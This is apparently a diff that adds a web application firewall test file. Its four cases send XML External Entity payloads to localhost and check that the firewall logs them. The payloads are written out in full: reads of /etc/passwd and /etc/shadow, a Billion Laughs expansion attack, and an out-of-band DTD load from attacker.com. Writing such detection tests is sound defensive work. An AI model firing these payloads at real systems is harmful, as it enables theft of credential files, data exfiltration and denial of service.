@@ -1,0 +1,66 @@
+meta:
+  author: "Antigravity"
+  description: "XML External Entity (XXE) Tests"
+  enabled: true
+  name: "949-xxe-injection"
+tests:
+  - test_id: 949100
+    desc: "Basic XXE: File Retrieval"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>"
+          output:
+            log_contains: "id \"949"
+  - test_id: 949101
+    desc: "XXE: Billion Laughs Attack (DoS)"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>"
+          output:
+            log_contains: "id \"949"
+  - test_id: 949102
+    desc: "Blind XXE: OOB Data Exfiltration"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/malicious.dtd\"> %xxe;]>"
+          output:
+            log_contains: "id \"949"
+  - test_id: 949103
+    desc: "XXE via SOAP"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+              Content-Type: "application/soap+xml"
+            data: "<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Header><foo><!DOCTYPE bar [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><bar>&xxe;</bar></foo></soap:Header><soap:Body/></soap:Envelope>"
+          output:
+            log_contains: "id \"949"
